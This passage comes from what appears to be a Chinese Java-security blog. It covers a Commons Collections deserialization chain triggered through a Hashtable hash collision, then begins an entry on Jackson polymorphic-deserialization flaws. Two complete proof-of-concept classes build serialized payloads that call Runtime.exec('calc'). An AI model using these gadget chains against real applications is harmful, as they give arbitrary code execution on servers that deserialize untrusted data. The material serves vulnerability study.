<p>然后就是要想办法调用<code>lazyMap</code>的equals方法<br>这里我们观察<br>Hashtable.readObject()<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231116145426.png" alt="Pasted image 20231116145426.png"></p>
<p>由于我们在Hashtable中存入了两个键值对<br>所以这里的elements值为2<br>然后调用reconstitutionPut()方法,它是一个计算hash然后给tab里加值的<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231116145531.png" alt="Pasted image 20231116145531.png"></p>
<p>这里我们发现有一个<code>e.key.equals(key)</code>,它有点像我们上面实例代码的利用点,想办法让e.key是lazymap</p>
<p>这里可以用的hash碰撞的方法来保证传入的lazymap的hash相等,那样的话这里的<code>hash和index</code>就相等,<code>Entry&lt;?,?&gt; e = tab[index] ;</code>就不为空(因为是第一次加的lazymap),从而进入for循环调用<code>e.key.equals(key)</code></p>
<p>hash碰撞的方法是设置key一个是0,一个是f5a5a608,因为hash的计算方法是<code>key.hashCode()</code>-&gt;<code>lazymap.hashcode()</code>-&gt;<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240507185009.png" alt="image.png"><br>然后跑到了<code>hashmap.hashCode()</code>-&gt;AbstractMap.hashCode()`</p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240507185107.png" alt="image.png"><br>原理就是jdk7u21的hash碰撞,hash计算后为0</p>
<h3 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">// 传入Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// 使用Runtime.class.getMethod()反射调用Runtime.getRuntime()</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">// invoke()调用Runtime.class.getMethod(&quot;getRuntime&quot;).invoke(null)</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">// 调用exec(&quot;calc&quot;)</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeformers);</span><br><span class="line">        <span class="comment">//new两个不同的HashMap对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//new 两个LazyMap对象，进行比较</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(map1, chain);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(map2, chain);</span><br><span class="line">        <span class="comment">//Map对象需要设置value和key值</span></span><br><span class="line">        lazyMap1.put(<span class="string">&quot;&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;f5a5a608&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2,<span class="number">1</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chain, transformers);</span><br><span class="line"></span><br><span class="line">        serialize(hashtable);</span><br><span class="line">        deserialize();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">            os.writeObject(obj);</span><br><span class="line">            os.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">is</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">test</span> <span class="operator">=</span> is.readObject();</span><br><span class="line">            System.out.println(test);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还有一个就是ysoserial的payload</p>
<h3 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        execArgs),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        f.set(transformerChain,  transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashtable);</span><br><span class="line">        deserialize();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">            os.writeObject(obj);</span><br><span class="line">            os.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">is</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">test</span> <span class="operator">=</span> is.readObject();</span><br><span class="line">            System.out.println(test);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个调试发现也可以进入for循环,两次的hash和index一样</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/647418911">https://zhuanlan.zhihu.com/p/647418911</a></p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Jackson漏洞总结</title>
    <url>/2024/05/10/Jackson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="简历"><a href="#简历" class="headerlink" title="简历"></a>简历</h2><p>Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java 对象序列化为 XML 或 JSON 格式的字符串，以及将 XML 或 JSON 格式的字符串反序列化为 Java 对象。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="JacksonPolymorphicDeserialization-机制"><a href="#JacksonPolymorphicDeserialization-机制" class="headerlink" title="JacksonPolymorphicDeserialization 机制"></a>JacksonPolymorphicDeserialization 机制</h2><p>即 Jackson 多态类型的反序列化：在反序列化某个类对象的过程中，如果类的成员变量不是具体类型（non-concrete），比如 Object、接口或抽象类，则可以在 JSON 字符串中指定其具体类型，Jackson 将生成具体类型的实例。</p>
<h3 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h3><p><strong>默认情况下，即无参数的 enableDefaultTyping 是第二个设置，OBJECT_AND_NON_CONCRETE</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>DefaultTyping类型</th>
<th>描述说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>JAVA_LANG_OBJECT</td>
<td>属性的类型为Object</td>
</tr>
<tr>
<td>OBJECT_AND_NON_CONCRETE</td>
<td>属性的类型为Object、Interface、AbstractClass</td>
</tr>
<tr>
<td>NON_CONCRETE_AND_ARRAYS</td>
<td>属性的类型为Object、Interface、AbstractClass、Array</td>
</tr>
<tr>
<td>NON_FINAL</td>
<td>所有除了声明为final之外的属性</td>
</tr>
</tbody>
</table>
</div>
<p>eg.<br>Person.java<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>Hacker.java<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hacker</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">skill</span> <span class="operator">=</span> <span class="string">&quot;hiphop&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>JAVA_LANG_OBJECTTest.java<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JAVA_LANG_OBJECTTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        p.age = <span class="number">20</span>;</span><br><span class="line">        p.name = <span class="string">&quot;jmx&quot;</span>;</span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="comment">// 设置JAVA_LANG_OBJECT</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>NON_LANG_OBJECT.java<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NON_LANG_OBJECT</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        Person person=<span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.age=<span class="number">20</span>;</span><br><span class="line">        person.name=<span class="string">&quot;jmx&quot;</span>;</span><br><span class="line">        person.object=<span class="keyword">new</span> <span class="title class_">Hacker</span>();</span><br><span class="line">        ObjectMapper objectMapper=<span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        String json=objectMapper.writeValueAsString(person);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        Person res=objectMapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>比较输出结果<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;jmx&quot;,&quot;object&quot;:[&quot;Hacker&quot;,&#123;&quot;skill&quot;:&quot;hiphop&quot;&#125;]&#125;</span><br><span class="line">Person.age=20, Person.name=jmx, Hacker@643b1d11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;jmx&quot;,&quot;object&quot;:&#123;&quot;skill&quot;:&quot;hiphop&quot;&#125;&#125;</span><br><span class="line">Person.age=20, Person.name=jmx, &#123;skill=hiphop&#125;</span><br></pre></td></tr></table></figure><br>可以发现enableDefaultTyping的成功反序列化出Hacker这个Object实例</p>
<p>其他三个一样的改法,可以自行查看区别</p>
<h3 id="JsonTypeInfo-注解"><a href="#JsonTypeInfo-注解" class="headerlink" title="@JsonTypeInfo 注解"></a>@JsonTypeInfo 注解</h3><p>有几个参数:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JsonTypeInfo.Id.NONE</span><br><span class="line">JsonTypeInfo.Id.CLASS</span><br><span class="line">JsonTypeInfo.Id.MINIMAL_CLASS</span><br><span class="line">JsonTypeInfo.Id.NAME</span><br><span class="line">JsonTypeInfo.Id.CUSTOM</span><br></pre></td></tr></table></figure><br>这里最后只有<code>JsonTypeInfo.Id.CLASS</code>和<code>JsonTypeInfo.Id.MINIMAL_CLASS</code>可以成功指定Object,触发漏洞</p>
<p>eg.<br>修改Person类,给Object属性添加注解<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span></span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>此时我们执行NON_LANG_OBJECT.java会发现Hacker被反序列化出来了<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NON_LANG_OBJECT</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        Person person=<span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.age=<span class="number">20</span>;</span><br><span class="line">        person.name=<span class="string">&quot;jmx&quot;</span>;</span><br><span class="line">        person.object=<span class="keyword">new</span> <span class="title class_">Hacker</span>();</span><br><span class="line">        ObjectMapper objectMapper=<span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        String json=objectMapper.writeValueAsString(person);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        Person res=objectMapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;jmx&quot;,&quot;object&quot;:&#123;&quot;@class&quot;:&quot;Hacker&quot;,&quot;skill&quot;:&quot;hiphop&quot;&#125;&#125;</span></span><br><span class="line"><span class="comment">//Person.age=20, Person.name=jmx, Hacker@cc285f4</span></span><br></pre></td></tr></table></figure></p>
<p>反序列化的结论:<br><strong>在 Jackson 反序列化中，若调用了 <code>enableDefaultTyping()</code> 函数或使用 <code>@JsonTypeInfo</code> 注解指定反序列化得到的类的属性为 <code>JsonTypeInfo.Id.CLASS</code> 或 <code>JsonTypeInfo.Id.MINIMAL_CLASS</code>，则会调用该属性的类的构造函数和 setter 方法。</strong></p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>满足下面三个条件之一即存在Jackson反序列化漏洞：</p>
<ul>
<li>调用了ObjectMapper.enableDefaultTyping()函数；</li>
<li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.CLASS的@JsonTypeInfo注解；</li>
<li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.MINIMAL_CLASS的@JsonTypeInfo注解；<br>这里有两个CVE,感兴趣的可以参考: <a href="https://xz.aliyun.com/t/12966">https://xz.aliyun.com/t/12966</a><h3 id="原生的反序列化"><a href="#原生的反序列化" class="headerlink" title="原生的反序列化"></a>原生的反序列化</h3><h4 id="TemplatesImpl链"><a href="#TemplatesImpl链" class="headerlink" title="TemplatesImpl链"></a>TemplatesImpl链</h4></li>
</ul>
<p>BadAttributeValueExpException的构造方法调用<code>val.toString()</code>,readObejct()也有toString()方法,通过反射修改val去调用<code>POJONode.toString</code>,它没有这个方法去父类找找找到<code>BaseJsonNode.toString()</code></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240510144639.png" alt="image.png"></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240430232614.png" alt="image.png"></p>
<p>然后调用<code>InternalNodeMapper.nodeToString</code>方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240430232642.png" alt="image.png"><br>调用<code>ObjectWriter.writeValueAsString</code>方法<br>一直跟进最后发现在<code>BeanPropertyWriter.serializeAsField</code>方法完成<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</code>方法的调用<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240430233936.png" alt="image.png"></p>
<p>后面就是加载动态字节码了</p>
<p>三个坑:</p>
<ol>
